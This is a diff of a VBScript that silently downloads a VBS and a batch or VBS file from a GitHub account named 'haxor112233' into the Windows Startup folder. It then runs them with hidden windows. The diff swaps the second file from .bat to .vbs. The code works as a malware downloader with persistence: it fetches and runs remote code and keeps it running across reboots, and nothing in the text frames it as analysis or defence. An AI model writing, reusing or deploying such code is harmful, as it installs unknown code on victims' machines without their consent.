@@ -31,14 +31,14 @@ startupFolder = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Win
 objShell.Run "cmd /c curl -s -o """ & startupFolder & "file.vbs"" ""https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/file.vbs""", 0, True
 
 ' Download file2.bat to Startup folder
-objShell.Run "cmd /c curl -s -o """ & startupFolder & "file2.bat"" ""https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/file2.bat""", 0, True
+objShell.Run "cmd /c curl -s -o """ & startupFolder & "file2.vbs"" ""https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/file2.vbs""", 0, True
 
 
 ' Get the Startup folder path
 StartupFolder = objShell.SpecialFolders("Startup")
 
 ' Run file2.bat from the Startup folder
-objShell.Run Chr(34) & StartupFolder & "\file2.bat" & Chr(34), 0, False
+objShell.Run Chr(34) & StartupFolder & "\file2.vbs" & Chr(34), 0, False
 
 ' Run file.vbs from the Startup folder
 objShell.Run Chr(34) & StartupFolder & "\file.vbs" & Chr(34), 0, False
